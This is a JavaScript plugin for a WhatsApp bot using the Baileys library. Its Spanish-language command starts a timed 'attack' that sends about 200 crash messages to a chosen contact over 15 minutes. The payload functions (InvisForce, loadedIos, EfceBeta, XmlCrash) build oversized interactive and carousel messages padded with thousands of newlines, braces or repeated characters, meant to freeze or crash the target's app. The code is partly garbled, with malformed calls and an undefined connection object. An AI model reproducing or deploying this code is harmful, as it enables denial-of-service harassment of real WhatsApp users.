import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn }) => { const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat; if (jid === conn.user.id) { return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m }); }

const bot = conn.user.id; if (m.sender !== bot) return;

await conn.sendMessage(m.chat, { text: '🧨 Ataque iniciado. Se enviarán 200 mensajes en 15 minutos.' }, { quoted: m });

conn.sendMessage(m.chat, { text: '🚀 Ataque 1 iniciado (0:00). Duración: 5 minutos.' }, { quoted: m }); for (let round = 0; round < 10; round++) { setTimeout(() => enviarTanda(conn, jid, round + 1, m, '1'), round * 30000); }

setTimeout(() => { conn.sendMessage(m.chat, { text: '🚀 Ataque 2 iniciado (5:00). Duración: 5 minutos.' }, { quoted: m }); for (let round = 0; round < 10; round++) { setTimeout(() => enviarTanda(conn, jid, round + 1, m, '2'), round * 30000); } }, 5 * 60 * 1000);

setTimeout(() => { conn.sendMessage(m.chat, { text: '🚀 Ataque 3 iniciado (10:00). Duración: 5 minutos.' }, { quoted: m }); for (let round = 0; round < 10; round++) { setTimeout(() => enviarTanda(conn, jid, round + 1, m, '3'), round * 30000); }

// Final
setTimeout(() => {
  conn.sendMessage(m.chat, { text: '🎯 Ataque finalizado. 200 mensajes enviados en total.' }, { quoted: m });
}, 5 * 60 * 1000);

}, 10 * 60 * 1000); };

handler.command = /^(buenas|force-beta)$/i; export default handler;

function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

async function enviarTanda(conn, jid, num, m, ciclo) { const funciones = ['InvisForce', 'loadedIos', 'EfceBeta', 'XmlCrash']; try { for (let i = 0; i < 20; i++) { const aleatoria = funciones[Math.floor(Math.random() * funciones.length)]; const msg = await globalThisaleatoria; await conn.sendMessage(conn.user.id, { delete: msg.key }); await delay(1000); } await conn.sendMessage(m.chat, { text: ✅ Tanda ${num}/10 del ataque ${ciclo} enviada., }, { quoted: m }); } catch (e) { console.error("❌ Error en tanda:", e); await conn.sendMessage(m.chat, { text: "❌ Error en tanda:\n" + e.message, }, { quoted: m }); } }

// Funciones del ataque

globalThis.InvisForce = async function(target) { const msg = await generateWAMessageFromContent(target, { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 }, interactiveMessage: { body: { text: 'MENSION XTRASH' }, footer: { text: 'MENSION XERVIX' }, carouselMessage: { cards: [ { header: { title: ' MENSION XERVIX  ', imageMessage: { url: "https://mmg.whatsapp.net/v/t62.7118-24/...", mimetype: "image/jpeg", fileSha256: "...", fileLength: "164089", height: 1, width: 1, mediaKey: "...", fileEncSha256: "...", directPath: "/v/t62.7118-24/...", mediaKeyTimestamp: "1749172037", jpegThumbnail: "...", scansSidecar: "...", scanLengths: [8596, 155493] }, hasMediaAttachment: true }, body: { text: " MENSION XERVIX  " }, footer: { text: "null.json" }, nativeFlowMessage: { messageParamsJson: "\n".repeat(10000) } } ] }, contextInfo: { participant: "0@s.whatsapp.net", quotedMessage: { viewOnceMessage: { message: { interactiveResponseMessage: { body: { text: "Mension Xervix", format: "DEFAULT" }, nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: "{ null.json }", version: 3 } } } } }, remoteJid: "@s.whatsapp.net" } } } } }, {}); await zalll.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [target], additionalNodes: [ { tag: "meta", attrs: {}, content: [ { tag: "mentioned_users", attrs: {}, content: [ { tag: "to", attrs: { jid: target }, content: undefined } ] } ] } ] }); return msg; };

globalThis.loadedIos = async function(target) { await zalll.sendMessage(target, { text: "🧪‌⃰Ꮡ‌‌⛧ Zall :: CONCƱΣЯЯOR ⛧҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000), contextInfo: { externalAdReply: { title: "⛧ Zall :: CONCƱΣЯЯOR ⛧", body: Haii ${target}, previewType: "PHOTO", thumbnail: "", sourceUrl: "https://example.com/tama" } } }); };

globalThis.EfceBeta = async function(target) { const msg = await generateWAMessageFromContent(target, { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 }, interactiveMessage: { body: { text: '' }, footer: { text: '' }, carouselMessage: { cards: [ { header: { title: 'Mikasa Crasher', imageMessage: { url: "https://mmg.whatsapp.net/v/t62.7118-24/...", mimetype: "image/jpeg", fileSha256: "...", fileLength: "164089", height: 1, width: 1, mediaKey: "...", fileEncSha256: "...", directPath: "/v/t62.7118-24/...", mediaKeyTimestamp: "1749172037", jpegThumbnail: "...", scansSidecar: "...", scanLengths: [8596, 155493] }, hasMediaAttachment: true }, body: { text: "Mikasa x Shadow" }, footer: { text: "phynx.json" }, nativeFlowMessage: { messageParamsJson: "\n".repeat(10000) } } ] }, contextInfo: { participant: "0@s.whatsapp.net", quotedMessage: { viewOnceMessage: { message: { interactiveResponseMessage: { body: { text: "Sent", format: "DEFAULT" }, nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: "{ phynx.json }", version: 3 } } } } }, remoteJid: "@s.whatsapp.net" } } } } }, {}); await zalll.relayMessage(target, msg.message, { participant: { jid: target }, messageId: msg.key.id }); return msg; };

globalThis.XmlCrash = async function(target) { const msg = await generateWAMessageFromContent(target, { viewOnceMessage: { message: { interactiveMessage: { header: { title: "Zall", hasMediaAttachment: false }, body: { text: "Zall" }, nativeFlowMessage: { messageParamsJson: "{".repeat(10000) } } } } }, {}); await zalll.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } }); return msg; };

